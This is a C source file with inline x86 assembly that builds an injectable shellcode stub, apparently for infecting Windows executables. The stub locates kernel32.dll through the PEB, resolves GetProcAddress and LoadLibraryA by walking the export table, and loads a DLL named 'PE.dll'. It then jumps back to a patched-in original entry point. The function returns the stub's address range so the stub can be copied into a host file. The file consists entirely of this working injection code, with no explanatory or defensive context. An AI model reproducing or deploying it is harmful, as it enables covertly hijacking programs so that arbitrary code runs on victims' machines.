#include <windows.h>
void LoadLibaryInjectCodes(DWORD *StartAddr, DWORD *EndAddr)
{
	DWORD _ASM_St_Addr, _ASM_Ed_Addr;
	_asm
	{
		call offset _Label_s
_Label_s :
		pop _ASM_St_Addr
		jmp offset _Label_m
		//{
		pushad										//pushad
		mov eax, dword ptr fs : [30h];
		mov eax, dword ptr[eax + 0Ch];
		mov eax, dword ptr[eax + 0Ch];
		mov eax, dword ptr[eax];
		mov eax, dword ptr[eax];
		mov eax, dword ptr[eax + 18h];
		mov edi, eax; Kernel.dll BaseAddress
		mov eax, dword ptr ss : [edi + 3CH]
		mov edx, dword ptr ds : [eax + edi + 78H];
		add edx, edi; edx:export table address
		mov ecx, dword ptr ds : [edx + 18H]; ecx:NumberOfFunctions
		mov ebx, dword ptr ds : [edx + 20H];
		add ebx, edi; ebx:AddressOfName
		GetProcALoop : ;
		dec ecx;
		mov esi, dword ptr ds : [ebx + ecx * 4];
		add esi, edi;
		mov eax, 50746547h;
		cmp dword ptr ds : [esi], eax;
		jnz GetProcALoop;
		mov eax, 41636F72h;
		cmp dword ptr ds : [esi + 4], eax; Acor, GetProcA GetProcAddress
		jnz GetProcALoop;
		mov ebx, dword ptr ds : [edx + 24H];
		add ebx, edi;
		mov cx, word ptr ds : [ebx + ecx * 2];
		mov ebx, dword ptr ds : [edx + 1CH];
		add ebx, edi;
		mov eax, dword ptr ds : [ebx + ecx * 4];
		add eax, edi;
		mov ebx, eax; GetProcAddress->ebx
		push 0; structure LoadLibraryA
		push 41797261h; Ayra
		push 7262694Ch; rbiL
		push 64616F4Ch; daoL
		push esp;
		push edi; edi = kernel32.dll module
		call ebx;
		mov ebx, eax; ebx = GetProcAddress("LoadLibraryA")
		push 00006C6Ch; 00ll
		push 642E4550h; d.EP
			; PE.dll String

		lea  eax, [esp]; ;
		push eax;
		call ebx;
		add  esp, 24; clear stack
		popad
		call _label_instr_Cur_EP
		_label_instr_Cur_EP :
		pop eax
		mov ebx,eax
		sub ebx,[eax+17h]
		sub ebx,90h
		mov eax, [eax +13h]
		add eax,ebx
		jmp eax
			nop; 4 Bytes for OEP
			nop
			nop
			nop
			nop; 4 Bytes for relocation codes
			nop
			nop
			nop
			//}

_Label_m :
		call offset _Label_e
_Label_e :
		pop _ASM_Ed_Addr
	}
	*StartAddr = _ASM_St_Addr + 8;
	*EndAddr = _ASM_Ed_Addr - 6;
}
